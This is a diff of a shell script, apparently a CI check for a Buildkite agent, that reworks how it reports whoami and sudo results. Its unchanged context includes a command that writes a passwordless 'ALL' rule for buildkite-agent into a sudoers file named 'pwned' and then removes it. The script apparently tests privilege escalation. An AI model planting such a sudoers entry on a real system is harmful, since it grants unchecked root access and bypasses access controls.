@@ -22,22 +22,16 @@ echo +++ Checking /etc
 ls -lA /etc
 run-as-root ls -lA etc/sudoers.d
 
-echo +++ Testing sudo
-if sudo --non-interactive whoami; then
-  echo "sudo succeeded"
-else
-  echo "sudo failed"
-fi
+echo +++ Who am I?
+echo I am: "$(whoami)"
+echo sudo I am: "$(sudo --non-interactive whoami || echo "sudo failed")"
 
 echo --- Modifying sudoers
 run-as-root sh -c 'echo "buildkite-agent ALL=(ALL) NOPASSWD: ALL" > etc/sudoers.d/pwned'
 
-echo +++ Testing sudo
-if sudo --non-interactive whoami; then
-  echo "sudo succeeded"
-else
-  echo "sudo failed"
-fi
+echo +++ Who am I?
+echo I am: "$(whoami)"
+echo sudo I am: "$(sudo --non-interactive whoami || echo "sudo failed")"
 
 echo --- Cleaning up
 run-as-root rm -f etc/sudoers.d/pwned
